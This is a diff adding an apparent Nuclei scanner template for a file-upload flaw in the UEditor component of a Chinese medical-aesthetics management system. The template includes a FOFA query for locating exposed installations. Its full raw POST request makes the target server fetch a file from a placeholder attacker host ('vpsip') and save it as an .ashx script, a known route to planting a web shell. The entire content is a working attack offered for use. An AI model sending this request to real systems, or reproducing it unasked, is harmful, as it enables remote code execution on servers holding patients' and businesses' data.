@@ -1,0 +1,44 @@
+id: poc-9777515864
+info:
+  name: 宏脉医美行业管理系统UEditor编辑器存在文件上传漏洞_bk9r3z0u4k2g9w1u
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  tags: file-upload,unknown
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ''
+    fofa: title="宏脉医美行业管理系统"
+http:
+- raw:
+  - 'POST /content/Js/ueditor/net/controller.ashx?action=catchimage HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 47
+
+    Origin: null
+
+    Connection: close
+
+    Cookie: ASP.NET_SessionId=mzare1hg1ewzaxhakacjhfo0
+
+    Upgrade-Insecure-Requests: 1
+
+
+    source[]=http://vpsip/1.png?.ashx'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
